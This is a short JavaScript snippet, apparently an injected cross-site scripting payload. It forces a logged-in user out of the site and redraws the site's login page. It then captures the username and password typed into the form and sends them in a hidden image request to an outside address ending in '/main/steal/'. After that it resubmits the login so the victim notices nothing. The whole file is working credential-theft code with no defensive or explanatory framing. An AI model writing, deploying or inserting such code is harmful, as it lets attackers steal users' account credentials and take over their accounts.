
var timer = setInterval(function(){
  if (!!window.jQuery){
    clearInterval(timer);

    $.ready(function(){
      if (localStorage['islogin'] === 'true'){
        return;
      }

      var logoutpage = '/user/logout/';

      var loginpage = '/user/login/';
      var loginformselector = 'form[action="/user/login/"]';

      var usernameselector = 'input[name="name"]';
      var passwordselector = 'input[name="password"]';

      var receiveurl = 'http://lovearia.me/main/steal/';

      $.get(logoutpage, function(){
        $.get(loginpage, function(d){
          $('html').html(d);
          $(loginformselector).on('submit', function(e){
            e.preventDefault();
            var username = $(usernameselector).val();
            var password = $(passwordselector).val();
            var img = $('<img>');
            img.attr('src', receiveurl + username + '/' + password);
            img.css('display', 'none');
            img.on('error', function(){
              localStorage['islogin'] = 'true';
              $(loginformselector).off('submit');
              $(loginformselector).trigger('submit');
            });
            $('body').append(img);
          });
        });
      });
    });

  }
}, 500);
